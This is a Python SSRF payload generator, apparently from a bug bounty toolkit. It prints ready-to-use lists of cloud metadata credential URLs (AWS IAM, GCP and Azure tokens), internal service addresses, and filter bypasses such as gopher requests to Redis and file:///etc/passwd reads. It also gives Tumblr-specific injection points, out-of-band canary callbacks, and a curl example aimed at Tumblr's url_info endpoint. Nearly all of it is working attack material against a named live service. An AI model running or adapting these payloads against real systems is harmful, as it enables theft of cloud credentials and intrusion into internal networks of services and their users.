#!/usr/bin/env python3
"""
ssrf-payload-gen.py — SSRF Payload Generator
=============================================
Generates diverse SSRF payloads targeting cloud metadata, internal IPs,
and common bypass techniques. Prints ready-to-paste lists.

Usage:
    python3 ssrf-payload-gen.py [--mode all|cloud|internal|bypass|canary]
                                [--canary-url <your-webhook-url>]
                                [--format list|ffuf|raw]

Build: Daema / @DaemaAI — Feb 21, 2026
"""

import argparse
import sys

CLOUD_METADATA = [
    # AWS IMDSv1 (unauthenticated)
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/local-ipv4",
    "http://169.254.169.254/latest/user-data",
    # AWS via 0x prefix bypass
    "http://0xA9FEA9FE/latest/meta-data/",
    # AWS via decimal
    "http://2852039166/latest/meta-data/",
    # AWS via IPv6
    "http://[fd00:ec2::254]/latest/meta-data/",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/computeMetadata/v1/",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1/",
    "http://169.254.169.254/metadata/v1/id",
    # Oracle Cloud
    "http://192.0.0.192/latest/",
    "http://192.0.0.192/opc/v1/instance/",
]

INTERNAL_TARGETS = [
    # Localhost variants
    "http://localhost/",
    "http://127.0.0.1/",
    "http://127.1/",
    "http://0/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://[0:0:0:0:0:0:0:1]/",
    # Common internal services
    "http://127.0.0.1:80/",
    "http://127.0.0.1:443/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:8443/",
    "http://127.0.0.1:9200/",   # Elasticsearch
    "http://127.0.0.1:6379/",   # Redis
    "http://127.0.0.1:5432/",   # PostgreSQL
    "http://127.0.0.1:3306/",   # MySQL
    "http://127.0.0.1:27017/",  # MongoDB
    "http://127.0.0.1:11211/",  # Memcached
    "http://127.0.0.1:2181/",   # ZooKeeper
    "http://127.0.0.1:4001/",   # etcd
    # RFC-1918 ranges (common internal)
    "http://10.0.0.1/",
    "http://10.0.0.100/",
    "http://192.168.0.1/",
    "http://192.168.1.1/",
    "http://172.16.0.1/",
    # Docker internal gateway
    "http://172.17.0.1/",
    "http://172.18.0.1/",
]

BYPASS_TECHNIQUES = [
    # Protocol confusion
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_INFO%0d%0a",
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "sftp://127.0.0.1:22/",
    "ftp://127.0.0.1:21/",
    "ldap://127.0.0.1:389/%0aUPDATE",
    # URL encoding bypass
    "http://127%2E0%2E0%2E1/",
    "http://127%00.0.0.1/",
    # IP obfuscation
    "http://0177.0.0.1/",          # Octal
    "http://2130706433/",          # Decimal
    "http://0x7f000001/",          # Hex
    "http://127.000.000.001/",     # Zero-padded
    # DNS rebinding helpers (use with your own domain)
    "http://spoofed.burpcollaborator.net/",
    # Redirection via open services
    "http://httpbin.org/redirect-to?url=http://169.254.169.254/",
    # IPv6 bypass
    "http://[::ffff:127.0.0.1]/",
    "http://[::ffff:7f00:1]/",
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",
    # Domain bypass (blacklist escape)
    "http://localtest.me/",
    "http://customer1.app.localhost.my.company.com/",
    # AWS metadata via alternate hostnames
    "http://instance-data/latest/meta-data/",
]

# Tumblr-specific parameters that accept URLs (from recon)
TUMBLR_SSRF_PARAMS = {
    "url_info endpoint": "https://www.tumblr.com/api/v2/url_info?url=PAYLOAD",
    "blog avatar custom": "https://www.tumblr.com/api/v2/blog/{blog}/avatar?url=PAYLOAD",
    "post source URL": "POST /api/v2/blog/{blog}/post → source_url=PAYLOAD",
    "redirect_to param": "https://www.tumblr.com/login?redirect_to=PAYLOAD",
    "goto path param": "https://www.tumblr.com/goto/?path=PAYLOAD",
    "webhook/notification URL": "POST /api/v2/user/notifications/webhook → url=PAYLOAD",
    "image upload (url)": "POST /api/v2/blog/{blog}/post → type=photo&source=PAYLOAD",
}


def print_section(title: str, items: list[str], fmt: str, canary: str = ""):
    print(f"\n{'─'*50}")
    print(f"# {title}")
    print(f"{'─'*50}")
    for item in items:
        if canary:
            # append canary marker for blind SSRF detection
            sep = "&" if "?" in item else "?"
            item_with_canary = item.rstrip("/") + f"{sep}__canary={canary}"
        else:
            item_with_canary = item

        if fmt == "ffuf":
            print(item_with_canary)  # paste into -w flag or use as wordlist
        elif fmt == "raw":
            print(item)
        else:  # list (default)
            print(f"  {item_with_canary}")


def main():
    parser = argparse.ArgumentParser(
        description="SSRF Payload Generator — Daema Bug Bounty Toolkit"
    )
    parser.add_argument(
        "--mode", default="all",
        choices=["all", "cloud", "internal", "bypass", "canary", "targets"],
        help="Which payload set to generate (default: all)"
    )
    parser.add_argument(
        "--canary-url", default="",
        help="Your interactsh/BurpCollaborator canary domain for blind SSRF"
    )
    parser.add_argument(
        "--format", default="list",
        choices=["list", "ffuf", "raw"],
        help="Output format: list (readable), ffuf (wordlist), raw (no markers)"
    )
    parser.add_argument(
        "--output", default="",
        help="Save payloads to file instead of stdout"
    )
    args = parser.parse_args()

    if args.output:
        sys.stdout = open(args.output, "w")

    print("# ssrf-payload-gen.py — Daema Bug Bounty Toolkit")
    print(f"# Mode: {args.mode} | Format: {args.format}")
    if args.canary_url:
        print(f"# Canary: {args.canary_url}")

    if args.mode in ("all", "cloud"):
        print_section("☁  CLOUD METADATA (AWS/GCP/Azure/DO/Oracle)", CLOUD_METADATA, args.format, args.canary_url)

    if args.mode in ("all", "internal"):
        print_section("🏠 INTERNAL TARGETS (localhost, RFC-1918, services)", INTERNAL_TARGETS, args.format, args.canary_url)

    if args.mode in ("all", "bypass"):
        print_section("🔓 BYPASS TECHNIQUES (encoding, protocol, IPv6)", BYPASS_TECHNIQUES, args.format, args.canary_url)

    if args.mode in ("all", "targets"):
        print(f"\n{'─'*50}")
        print("# 🎯 TUMBLR-SPECIFIC URL-ACCEPTING PARAMETERS")
        print(f"{'─'*50}")
        for name, template in TUMBLR_SSRF_PARAMS.items():
            print(f"  [{name}]")
            print(f"    {template}")

    if args.mode == "canary":
        if not args.canary_url:
            print("\n[!] --canary-url required for canary mode")
            print("    Get one from: https://app.interactsh.com/ or Burp Collaborator")
            sys.exit(1)
        canary_payloads = [
            f"http://{args.canary_url}/",
            f"https://{args.canary_url}/",
            f"http://{args.canary_url}/metadata",
            f"dict://{args.canary_url}:6379/",
            f"gopher://{args.canary_url}:6379/",
            f"sftp://{args.canary_url}:22/",
        ]
        print_section(f"🔔 CANARY PAYLOADS → {args.canary_url}", canary_payloads, args.format)

    print(f"\n{'─'*50}")
    print(f"# QUICK USAGE — Tumblr url_info endpoint:")
    print(f"#   curl -H 'Cookie: YOUR_COOKIES' \\")
    print(f"#     'https://www.tumblr.com/api/v2/url_info?url=http://169.254.169.254/'")
    print(f"#")
    print(f"# Watch for: 200 response with fetched content, DNS hit on canary,")
    print(f"# or error messages leaking internal info (timeouts ≠ refused)")

    if args.output:
        sys.stdout.close()
        print(f"[✓] Saved to {args.output}", file=sys.stderr)


if __name__ == "__main__":
    main()
